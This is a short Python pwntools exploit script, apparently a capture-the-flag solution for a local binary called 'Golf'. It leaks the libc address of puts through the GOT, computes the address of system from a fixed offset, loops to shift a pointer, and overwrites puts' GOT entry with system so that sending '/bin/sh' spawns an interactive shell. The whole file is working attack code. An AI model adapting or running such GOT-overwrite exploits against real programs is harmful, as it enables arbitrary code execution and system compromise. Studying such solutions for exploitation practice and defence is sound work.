from pwn import *

puts_got_str = '804a014'
puts_got_hex = 0x804a014

p = process('./Golf')


# stage 0. leak the puts address in libc, and get system address
# context.log_level = 'debug'
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
p.sendline(b'1')
# print(p.recvline())

p.sendline(puts_got_str)


# p.recvline()
p.recvuntil('it\'s ')
puts_addr = p.recv(4)
stringlength=len(puts_addr) # calculate length of the list
slicedString=puts_addr[stringlength::-1] # slicing 
puts_addr_hex = int((slicedString).hex(), 16)
log.info('puts_addr_hex = 0x%x' % puts_addr_hex) # print the reversed string
system_addr_hex = puts_addr_hex - 0x2c4a0
log.info('systems_addr_hex = 0x%x' % system_addr_hex) # print the reversed string
p.recvuntil('2\n')

# stage 1. increase v1 to 0x804A030 = 0x410 * 129347, which is same to /bin/sh's address

for i in range(0, 0x410):
    p.sendline(b'3')
    p.recvuntil('2\n')

# context.log_level = 'debug'

# stage 2. overwrite system addr_hex on puts_got_addr
p.sendline(b'2')
p.recvline()
# p.interactive()
p.sendline(puts_got_str)
p.sendline(str(hex(system_addr_hex))[2:])

p.sendline('/bin/sh\x00')

p.interactive()
